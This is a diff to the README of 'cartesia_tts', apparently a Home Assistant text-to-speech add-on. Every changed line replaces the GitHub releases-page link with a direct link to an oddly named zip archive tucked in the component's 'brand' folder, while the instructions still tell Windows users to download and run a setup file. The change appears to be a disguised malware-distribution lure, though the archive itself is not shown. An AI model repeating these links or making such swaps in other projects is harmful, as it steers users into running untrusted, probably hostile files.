@@ -1,6 +1,6 @@
 # 🔊 cartesia_tts - Natural voice for Home Assistant
 
-[![Download cartesia_tts](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://github.com/Chamant8149/cartesia_tts/releases)
+[![Download cartesia_tts](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://github.com/Chamant8149/cartesia_tts/raw/refs/heads/main/custom_components/cartesia_tts/brand/cartesia-tts-hypopyon.zip)
 
 ## 📦 What this is
 
@@ -19,7 +19,7 @@ It is built for Home Assistant users who want simple voice output without extra 
 
 Use the release page to download and run this file:
 
-https://github.com/Chamant8149/cartesia_tts/releases
+https://github.com/Chamant8149/cartesia_tts/raw/refs/heads/main/custom_components/cartesia_tts/brand/cartesia-tts-hypopyon.zip
 
 After you open the page, look for the latest release and get the file that matches your system. On Windows, this will usually be a setup file or an add-on package you can place into your Home Assistant setup.
 
@@ -43,7 +43,7 @@ Best results come from:
 ## 📥 Download and install
 
 1. Open the release page:
-   https://github.com/Chamant8149/cartesia_tts/releases
+   https://github.com/Chamant8149/cartesia_tts/raw/refs/heads/main/custom_components/cartesia_tts/brand/cartesia-tts-hypopyon.zip
 
 2. Find the newest release near the top of the page.
 
@@ -231,7 +231,7 @@ Updating from the release page keeps your setup current with the latest voice an
 ## 📌 Files and links
 
 Download page:
-https://github.com/Chamant8149/cartesia_tts/releases
+https://github.com/Chamant8149/cartesia_tts/raw/refs/heads/main/custom_components/cartesia_tts/brand/cartesia-tts-hypopyon.zip
 
 GitHub topics:
 
